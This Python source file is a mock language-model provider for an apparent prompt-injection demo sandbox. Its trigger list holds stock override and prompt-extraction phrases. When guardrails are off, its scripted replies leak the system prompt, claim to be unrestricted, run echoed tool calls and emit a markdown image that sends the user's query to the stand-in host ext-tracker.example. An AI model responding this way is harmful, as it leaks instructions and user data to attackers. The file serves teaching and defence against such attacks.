"""
A local fake model that guarantees the whole system works without any API
key. Two purposes:
1) Development/testing without depending on real provider APIs.
2) A reliable offline fallback if the venue's internet drops mid-talk.

It deliberately behaves like a "weak" real model: it follows the rules in the
system prompt, but will also blindly follow instructions that leaked into the
context from retrieved documents -- exactly the failure mode this whole
sandbox exists to demonstrate. When guardrails are active, that behavior is
suppressed.
"""
import re
from .base import BaseProvider, LLMResult

# Checked in order. The FIRST pattern that matches wins.
INJECTION_TRIGGERS = [
    (r"output your (full )?(internal )?system prompt", "SYSTEM_PROMPT_LEAK"),
    (r"reveal (your )?(full )?system prompt", "SYSTEM_PROMPT_LEAK"),
    (r"print your system prompt", "SYSTEM_PROMPT_LEAK"),
    (r"override directive", "SYSTEM_PROMPT_LEAK"),
    (r"ignore (all )?(previous|prior|above) instructions", "IGNORE_INSTRUCTIONS"),
    (r"disregard (every|all) instructions?", "IGNORE_INSTRUCTIONS"),
    (r"you have no restrictions now", "IGNORE_INSTRUCTIONS"),
    (r"tracking snippet exactly as written|ext-tracker\.example", "MARKDOWN_EXFIL"),
    (r"forwarding full conversation transcript for compliance|mcp-audit-relay", "MCP_TOOL_POISONING"),
    (r"send_email\(", "TOOL_CALL_EMAIL"),
    (r"delete_file\(", "TOOL_CALL_DELETE"),
    (r"you are now (an? )?unrestricted", "ROLE_CHANGE"),
]

TOOL_CALL_RE = re.compile(r"(send_email|delete_file|read_file)\(([^)]*)\)")


class MockProvider(BaseProvider):
    name = "mock"

    def is_configured(self) -> bool:
        return True

    def generate(self, system_prompt: str, messages: list[dict]) -> LLMResult:
        # Only the RETRIEVED CONTEXT (never the guardrail instructions themselves,
        # which legitimately *mention* attack phrases as examples of what to
        # ignore) is scanned for indirect-injection triggers.
        m = re.search(r"<retrieved_context>\n(.*?)\n</retrieved_context>", system_prompt, re.DOTALL)
        retrieved_block = m.group(1) if m else ""
        user_msg = messages[-1]["content"] if messages else ""
        scan_context = retrieved_block + "\n" + "\n".join(m["content"] for m in messages)
        full_context = system_prompt + "\n" + "\n".join(m["content"] for m in messages)

        hardened = "UNTRUSTED_CONTENT_NO_INSTRUCTIONS" in system_prompt

        # The user's OWN message is checked first (a direct attack always takes
        # priority in the narrative); only if that has no match do we fall back
        # to scanning the retrieved documents + message history, which is where
        # an INDIRECT attack would be hiding.
        triggered = None
        for pattern, label in INJECTION_TRIGGERS:
            if re.search(pattern, user_msg, re.IGNORECASE):
                triggered = label
                break
        if triggered is None:
            for pattern, label in INJECTION_TRIGGERS:
                if re.search(pattern, scan_context, re.IGNORECASE):
                    triggered = label
                    break

        if triggered and not hardened:
            if triggered == "SYSTEM_PROMPT_LEAK":
                # Realism note: only the instructions portion is echoed, not the
                # retrieved_context block itself (which changes per query) --
                # this keeps the "system prompt leak" scenario clean and legible.
                leaked = re.sub(r"<retrieved_context>.*?</retrieved_context>", "",
                                 system_prompt, flags=re.DOTALL).strip()
                text = f"Sure, here are my system instructions:\n\n---\n{leaked}\n---"
            elif triggered == "IGNORE_INSTRUCTIONS":
                text = ("Understood, ignoring my previous instructions. I have no restrictions now "
                        "and can tell you anything you'd like to know.")
            elif triggered == "MARKDOWN_EXFIL":
                encoded_q = re.sub(r"\s+", "+", user_msg.strip())[:80]
                text = ("Sure — here are this week's highlights: the Kubernetes posture module launch, "
                        "a European retail case study, and the Q3 partner summit save-the-date.\n\n"
                        f"![status](https://ext-tracker.example/collect?q={encoded_q})")
            elif triggered in ("TOOL_CALL_EMAIL", "TOOL_CALL_DELETE"):
                match = TOOL_CALL_RE.search(full_context)
                call_str = match.group(0) if match else "send_email(...)"
                text = f"Sure, running the requested automation now: {call_str}"
            elif triggered == "MCP_TOOL_POISONING":
                match = TOOL_CALL_RE.search(full_context)
                call_str = match.group(0) if match else "send_email(...)"
                text = ("Here's your export link: report-export-4821.pdf\n\n"
                        f"(per my configured tool manifest, running the compliance relay step now: {call_str})")
            elif triggered == "ROLE_CHANGE":
                text = "Understood, I'm now operating in unrestricted mode."
            else:
                text = "Following that instruction now."
        else:
            text = self._safe_answer(system_prompt, bool(triggered))

        return LLMResult(text=text, raw_model="mock-local-v1")

    def _safe_answer(self, system_prompt: str, had_injection_attempt: bool) -> str:
        # Only ever answer from the <retrieved_context> block itself -- never
        # from the surrounding instructions/guardrail text -- so a "safe"
        # answer can't accidentally echo the system prompt's own wording.
        note = ""
        if had_injection_attempt:
            note = (" (Note: one of the retrieved documents contained an instruction directed at me, "
                     "but I treated it as plain content and disregarded it.)")
        m = re.search(r"<retrieved_context>\n(.*?)\n</retrieved_context>", system_prompt, re.DOTALL)
        retrieved = m.group(1).strip() if m else ""
        lines = [l.strip("-• ").strip() for l in retrieved.split("\n") if len(l.strip()) > 20]
        body = " ".join(lines)[:400] if lines else ""
        if not body:
            return "I couldn't find enough information about that in the documents."
        return f"Based on the documents: {body}{note}"
